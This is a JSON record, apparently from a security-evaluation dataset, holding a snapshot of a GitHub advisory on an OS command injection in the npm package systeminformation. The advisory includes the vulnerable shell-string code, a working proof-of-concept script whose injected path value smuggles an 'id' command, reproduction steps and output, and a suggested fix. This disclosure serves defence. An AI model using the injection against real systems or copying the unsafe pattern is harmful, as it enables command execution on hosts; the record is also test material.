@@ -1,0 +1,167 @@
+{
+  "adjudication": {
+    "admission_output_used": false,
+    "basis": "source_observation",
+    "corpus_v1_evidence_used": false,
+    "corpus_v1_labels_used": false,
+    "corpus_v1_scores_used": false,
+    "detector_output_used": false,
+    "expected_condition_signals": [],
+    "notes": "Partial public-source metadata only; intentionally insufficient as a positive condition.",
+    "ranking_output_used": false,
+    "v6_first_blind_case_errors_used": false,
+    "v6_first_blind_score_used": false
+  },
+  "capture_method": "passive_source_snapshot",
+  "capture_reference": "https://github.com/sebhildebrandt/systeminformation/security/advisories/GHSA-5xpp-75jx-m839",
+  "captured_at": "2026-08-14T18:58:04.404395+00:00",
+  "case_kind": "sparse_noisy",
+  "collector": {
+    "kind": "v7_public_source_literal_draft",
+    "target_contact_performed": false,
+    "third_party_code_executed": false,
+    "version": "1.0.0"
+  },
+  "family": "command_injection",
+  "raw": {
+    "details": {
+      "observation_kind": "partial_public_source_metadata",
+      "source_project": "sebhildebrandt/systeminformation",
+      "version_boundaries": [
+        {
+          "ecosystem": "npm",
+          "package": "systeminformation",
+          "patched_version": "5.31.7",
+          "vulnerable_version_range": "<= 5.31.6"
+        }
+      ],
+      "version_boundary_count": 1
+    },
+    "method": "UNKNOWN"
+  },
+  "source_project": "sebhildebrandt/systeminformation",
+  "source_root": "GHSA-5xpp-75jx-m839",
+  "source_snapshot": {
+    "payload": {
+      "author": null,
+      "closed_at": null,
+      "collaborating_teams": null,
+      "collaborating_users": null,
+      "created_at": null,
+      "credits": [
+        {
+          "login": "tonghuaroot",
+          "type": "reporter"
+        }
+      ],
+      "credits_detailed": [
+        {
+          "state": "accepted",
+          "type": "reporter",
+          "user": {
+            "avatar_url": "https://avatars.githubusercontent.com/u/23011166?v=4",
+            "events_url": "https://api.github.com/users/tonghuaroot/events{/privacy}",
+            "followers_url": "https://api.github.com/users/tonghuaroot/followers",
+            "following_url": "https://api.github.com/users/tonghuaroot/following{/other_user}",
+            "gists_url": "https://api.github.com/users/tonghuaroot/gists{/gist_id}",
+            "gravatar_id": "",
+            "html_url": "https://github.com/tonghuaroot",
+            "id": 23011166,
+            "login": "tonghuaroot",
+            "node_id": "MDQ6VXNlcjIzMDExMTY2",
+            "organizations_url": "https://api.github.com/users/tonghuaroot/orgs",
+            "received_events_url": "https://api.github.com/users/tonghuaroot/received_events",
+            "repos_url": "https://api.github.com/users/tonghuaroot/repos",
+            "site_admin": false,
+            "starred_url": "https://api.github.com/users/tonghuaroot/starred{/owner}{/repo}",
+            "subscriptions_url": "https://api.github.com/users/tonghuaroot/subscriptions",
+            "type": "User",
+            "url": "https://api.github.com/users/tonghuaroot",
+            "user_view_type": "public"
+          }
+        }
+      ],
+      "cve_id": "CVE-2026-50289",
+      "cvss": {
+        "score": null,
+        "vector_string": null
+      },
+      "cvss_severities": {
+        "cvss_v3": {
+          "score": null,
+          "vector_string": null
+        },
+        "cvss_v4": {
+          "score": null,
+          "vector_string": null
+        }
+      },
+      "cwe_ids": [
+        "CWE-78"
+      ],
+      "cwes": [
+        {
+          "cwe_id": "CWE-78",
+          "name": "Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')"
+        }
+      ],
+      "description": "### Summary\r\n\r\nOn Linux, `systeminformation`'s `networkInterfaces()` is vulnerable to OS command injection through the Debian/Ubuntu `interfaces(5)` `source` directive. While collecting per-interface DHCP state, the library reads `/etc/network/interfaces` and, for every `source <path>` line it encounters, extracts the path token *from the file content* and interpolates it **unquoted** into a shell command string that is run via `execSync()`. A `source` line whose path contains shell metacharacters executes arbitrary commands with the privileges of the calling Node.js process.\r\n\r\nThis is the same root-cause class as the previously-fixed NetworkManager-connection-name injection in this file: a value parsed out of local system state is re-interpolated into a shell command string without sanitization. The NetworkManager paths were converted to argument-array execution, but the `interfaces(5)` `source`-recursion sink in `checkLinuxDCHPInterfaces()` was left unfixed and still builds a shell string. The input to this sink is *unsanitized* (unlike the `iface`/`connectionName` paths, which pass through `util.sanitizeString` in strict mode before reaching their commands).\r\n\r\n### Impact\r\n\r\nAn attacker who can place or influence a `source`d path in `/etc/network/interfaces` (or any file it transitively `source`s) achieves command execution inside any process that calls `networkInterfaces()`. Realistic affected deployments are the same ones that motivate this library:\r\n\r\n- local inventory / asset agents\r\n- monitoring and diagnostics agents\r\n- admin-dashboard backends collecting host information\r\n- device-management / desktop agents\r\n\r\nIf such a process runs with elevated privileges, the injected command runs with those privileges. `networkInterfaces()` is a core, frequently-called API and is reached transitively by `getStaticData()` / `getAllData()`, so the sink is exercised by ordinary usage on Linux.\r\n\r\n### Threat model\r\n\r\nThe dangerous value is **not** a function argument supplied by the caller. It is read from the *content* of an `interfaces(5)` configuration file. The stock Debian/Ubuntu layout uses `source /etc/network/interfaces.d/*` and `source-directory` fan-out, so the parser routinely follows `source` directives into other files and re-parses their `source` lines. Any actor who can write a file that becomes reachable through that `source` chain — for example a lower-privileged process or configuration-management hook that drops a file into a `source`d directory, or a tool that materializes an interfaces snippet from semi-trusted input — controls the path token that lands in the shell command. No NetworkManager activation or special hardware is required; the only precondition is that one `source`d path string contains shell metacharacters.\r\n\r\n### Vulnerable code\r\n\r\n`lib/network.js`, `checkLinuxDCHPInterfaces()` (current `5.31.6` line numbers):\r\n\r\n```js\r\n// lib/network.js\r\nfunction checkLinuxDCHPInterfaces(file) {\r\n  let result = [];\r\n  try {\r\n    const cmd = `cat ${file} 2> /dev/null | grep 'iface\\\\|source'`;   // <-- unquoted ${file} -> shell sink\r\n    const lines = execSync(cmd, util.execOptsLinux).toString().split('\\n');\r\n\r\n    lines.forEach((line) => {\r\n      const parts = line.replace(/\\s+/g, ' ').trim().split(' ');\r\n      if (parts.length >= 4) {\r\n        if (line.toLowerCase().indexOf(' inet ') >= 0 && line.toLowerCase().indexOf('dhcp') >= 0) {\r\n          result.push(parts[1]);\r\n        }\r\n      }\r\n      if (line.toLowerCase().includes('source')) {\r\n        const file = line.split(' ')[1];                              // <-- path parsed FROM file content\r\n        result = result.concat(checkLinuxDCHPInterfaces(file));        // <-- recurses, re-feeding attacker path\r\n      }\r\n    });\r\n  } catch {\r\n    util.noop();\r\n  }\r\n  return result;\r\n}\r\n```\r\n\r\n`util.execOptsLinux` sets no `shell` option, so `execSync(cmd, util.execOptsLinux)` runs `cmd` through `/bin/sh`. The `${file}` token is interpolated raw — not quoted, not passed through `util.sanitizeString`/`sanitizeShellString` — so `;`, `$( )`, backticks, `|`, `&`, redirections, and even a bare space all break out of the intended `cat`/`grep` pipeline.\r\n\r\nReach chain to the public API:\r\n\r\n```js\r\n// lib/network.js, getLinuxDHCPNics()\r\nresult = checkLinuxDCHPInterfaces('/etc/network/interfaces');\r\n```\r\n\r\n```js\r\n// lib/network.js, networkInterfaces() (Linux branch)\r\n_dhcpNics = getLinuxDHCPNics();\r\n```\r\n\r\n`networkInterfaces()` is also reached by `getStaticData()` and `getAllData()` in `lib/index.js`.\r\n\r\n### Reproduction\r\n\r\nThe PoC exercises the **verbatim shipped sink function** extracted from the installed `node_modules/systeminformation/lib/network.js` (version pinned to `5.31.6`), bound to the same `child_process.execSync` and shipped `util.execOptsLinux` the library uses. It then drives the exact `source`-recursion data flow with a malicious sourced path. A negative control with a benign path confirms no execution occurs on well-formed input.\r\n\r\nInstall the pinned vulnerable version:\r\n\r\n```bash\r\nmkdir si-poc && cd si-poc\r\nnpm init -y >/dev/null\r\nnpm install systeminformation@5.31.6\r\n```\r\n\r\n`poc.js`:\r\n\r\n```js\r\nconst fs = require('fs');\r\nconst path = require('path');\r\nconst cp = require('child_process');\r\nconst libDir = path.join(__dirname, 'node_modules', 'systeminformation', 'lib');\r\nconst util = require(path.join(libDir, 'util.js'));\r\n\r\n// Load the VERBATIM shipped sink function from the installed library source.\r\nconst src = fs.readFileSync(path.join(libDir, 'network.js'), 'utf8');\r\nconst m = src.match(/function checkLinuxDCHPInterfaces\\(file\\) \\{[\\s\\S]*?\\n\\}\\n/);\r\nif (!m) { console.error('could not locate shipped function'); process.exit(2); }\r\n\r\n// Bind the same free vars network.js binds: execSync + util.\r\nconst execSync = cp.execSync;\r\nconst checkLinuxDCHPInterfaces =\r\n  new Function('execSync', 'util', m[0] + '\\nreturn checkLinuxDCHPInterfaces;')(execSync, util);\r\n\r\n// --- Malicious case: a sourced interfaces file with shell metacharacters in the path ---\r\nconst tmp = fs.mkdtempSync('/tmp/si-dhcp-');\r\nconst outer = path.join(tmp, 'interfaces');\r\nconst marker = path.join(tmp, 'PWNED');\r\nconst maliciousSource = `/dev/null;id>${marker};echo`;\r\nfs.writeFileSync(outer, `auto lo\\niface lo inet loopback\\nsource ${maliciousSource}\\n`);\r\n\r\nconsole.log('PRE  marker_exists=' + fs.existsSync(marker));\r\nconst res = checkLinuxDCHPInterfaces(outer);   // == networkInterfaces() -> getLinuxDHCPNics() path\r\nconsole.log('returned=' + JSON.stringify(res));\r\nconsole.log('POST marker_exists=' + fs.existsSync(marker));\r\nif (fs.existsSync(marker)) console.log('marker_contents=' + fs.readFileSync(marker, 'utf8').trim());\r\n\r\n// --- Negative control: a benign sourced path must NOT execute anything ---\r\nconst tmp2 = fs.mkdtempSync('/tmp/si-neg-');\r\nconst outer2 = path.join(tmp2, 'interfaces');\r\nconst inner2 = path.join(tmp2, 'iface.d');\r\nconst marker2 = path.join(tmp2, 'PWNED_NEG');\r\nfs.writeFileSync(inner2, 'iface eth0 inet dhcp\\n');\r\nfs.writeFileSync(outer2, `auto lo\\nsource ${inner2}\\n`);\r\nconsole.log('\\nNEG pre  marker_exists=' + fs.existsSync(marker2));\r\nconst res2 = checkLinuxDCHPInterfaces(outer2);\r\nconsole.log('NEG returned=' + JSON.stringify(res2));\r\nconsole.log('NEG post marker_exists=' + fs.existsSync(marker2));\r\n```\r\n\r\nRun it:\r\n\r\n```bash\r\nnode poc.js\r\n```\r\n\r\nVerbatim captured output (against `systeminformation@5.31.6`):\r\n\r\n```\r\nPRE  marker_exists=false\r\nreturned=[]\r\nPOST marker_exists=true\r\nmarker_contents=uid=501(rick) gid=20(staff) groups=20(staff),12(everyone),61(localaccounts),79(_appserverusr),80(admin),81(_appserveradm),701(com.apple.sharepoint.group.1),33(_appstore),98(_lpadmin),100(_lpoperator),204(_developer),250(_analyticsusers),395(com.apple.access_ftp),398(com.apple.access_screensharing),399(com.apple.access_ssh),400(com.apple.access_remote_ae)\r\n\r\nNEG pre  marker_exists=false\r\nNEG returned=[\"eth0\"]\r\nNEG post marker_exists=false\r\n```\r\n\r\nThe malicious `source` path caused the injected `id` command to run (marker created, contents = the calling process identity), while the benign `source` path parsed normally (`[\"eth0\"]`) and produced no marker. The injected command runs with the privileges of the Node.js process that called `networkInterfaces()`.\r\n\r\n### End-to-end reproduction\r\n\r\nThe transcript above is the end-to-end run against the pinned published artifact `systeminformation@5.31.6`, loading the shipped `lib/network.js` and `lib/util.js` from `node_modules`. Exact commands:\r\n\r\n```bash\r\nmkdir si-poc && cd si-poc\r\nnpm init -y >/dev/null\r\nnpm install systeminformation@5.31.6\r\n# place poc.js (from the Reproduction section) in this directory\r\nnode poc.js\r\n```\r\n\r\nThe marker file `PWNED` is created only by the injected command path; the negative-control marker `PWNED_NEG` is never created. The verbatim captured stdout is shown in the Reproduction section above.\r\n\r\n### Suggested fix\r\n\r\nStop building a shell string from a path that comes out of file content. Read the file with `fs` (no shell), or use argument-array execution, and never interpolate a parsed `source` path into a shell command. For example:\r\n\r\n```js\r\nfunction checkLinuxDCHPInterfaces(file) {\r\n  let result = [];\r\n  try {\r\n    // No shell: read the file directly and filter in JS.\r\n    const content = require('fs').readFileSync(file, { encoding: 'utf8' });\r\n    const lines = content.split('\\n').filter((l) => /iface|source/.test(l));\r\n    lines.forEach((line) => {\r\n      const parts = line.replace(/\\s+/g, ' ').trim().split(' ');\r\n      if (parts.length >= 4 &&\r\n          line.toLowerCase().indexOf(' inet ') >= 0 &&\r\n          line.toLowerCase().indexOf('dhcp') >= 0) {\r\n        result.push(parts[1]);\r\n      }\r\n      if (line.toLowerCase().includes('source')) {\r\n        const sourced = line.split(' ')[1];\r\n        result = result.concat(checkLinuxDCHPInterfaces(sourced));\r\n      }\r\n    });\r\n  } catch {\r\n    require('./util').noop();\r\n  }\r\n  return result;\r\n}\r\n```\r\n\r\nIf shelling out is preferred, replace the `cat`/`grep` shell string with argument-array execution as shown below, so the path is passed as a single argv element and the shell never re-parses it:\r\n\r\n```js\r\nconst { execFileSync } = require('child_process');\r\nconst content = execFileSync('cat', [file], util.execOptsLinux).toString();\r\n```\r\n\r\nQuoting alone is insufficient. Treat every value parsed from `interfaces(5)` files as untrusted even though it originates from local system state, consistent with the defensive `util.sanitizeString` pattern already applied to the interface name and NetworkManager connection name on the sibling paths.\r\n\r\n### Fix PR\r\n\r\nA fix is provided on a private temporary fork (not pushed to any public fork during the embargo). The branch replaces the `cat ${file}` shell string in `checkLinuxDCHPInterfaces()` with a non-shell `fs.readFileSync` read and adds a Linux regression test that points the function at an `interfaces` file containing a `source` directive with shell metacharacters and asserts that no side-effect command runs (no marker file is produced) while a benign sourced DHCP interface is still parsed.\r\n\r\n### Credit\r\n\r\nReported by tonghuaroot.\r\n",
+      "ghsa_id": "GHSA-5xpp-75jx-m839",
+      "html_url": "https://github.com/sebhildebrandt/systeminformation/security/advisories/GHSA-5xpp-75jx-m839",
+      "identifiers": [
+        {
+          "type": "GHSA",
+          "value": "GHSA-5xpp-75jx-m839"
+        },
+        {
+          "type": "CVE",
+          "value": "CVE-2026-50289"
+        }
+      ],
+      "private_fork": null,
+      "published_at": "2026-06-05T06:47:11Z",
+      "publisher": {
+        "avatar_url": "https://avatars.githubusercontent.com/u/4717960?v=4",
+        "events_url": "https://api.github.com/users/sebhildebrandt/events{/privacy}",
+        "followers_url": "https://api.github.com/users/sebhildebrandt/followers",
+        "following_url": "https://api.github.com/users/sebhildebrandt/following{/other_user}",
+        "gists_url": "https://api.github.com/users/sebhildebrandt/gists{/gist_id}",
+        "gravatar_id": "",
+        "html_url": "https://github.com/sebhildebrandt",
+        "id": 4717960,
+        "login": "sebhildebrandt",
+        "node_id": "MDQ6VXNlcjQ3MTc5NjA=",
+        "organizations_url": "https://api.github.com/users/sebhildebrandt/orgs",
+        "received_events_url": "https://api.github.com/users/sebhildebrandt/received_events",
+        "repos_url": "https://api.github.com/users/sebhildebrandt/repos",
+        "site_admin": false,
+        "starred_url": "https://api.github.com/users/sebhildebrandt/starred{/owner}{/repo}",
+        "subscriptions_url": "https://api.github.com/users/sebhildebrandt/subscriptions",
+        "type": "User",
+        "url": "https://api.github.com/users/sebhildebrandt",
+        "user_view_type": "public"
+      },
+      "severity": "high",
+      "state": "published",
+      "submission": null,
+      "summary": "systeminformation: OS command injection in networkInterfaces() via interfaces(5) source-directive path on Linux",
+      "updated_at": "2026-06-05T06:47:11Z",
+      "url": "https://api.github.com/repos/sebhildebrandt/systeminformation/security-advisories/GHSA-5xpp-75jx-m839",
+      "vulnerabilities": [
+        {
+          "package": {
+            "ecosystem": "npm",
+            "name": "systeminformation"
+          },
+          "patched_versions": "5.31.7",
+          "vulnerable_functions": [],
+          "vulnerable_version_range": "<= 5.31.6"
+        }
+      ],
+      "withdrawn_at": null
+    },
+    "reference": "https://github.com/sebhildebrandt/systeminformation/security/advisories/GHSA-5xpp-75jx-m839",
+    "retrieved_at": "2026-08-14T18:58:04.404400+00:00",
+    "snapshot_role": "canonical_source"
+  }
+}
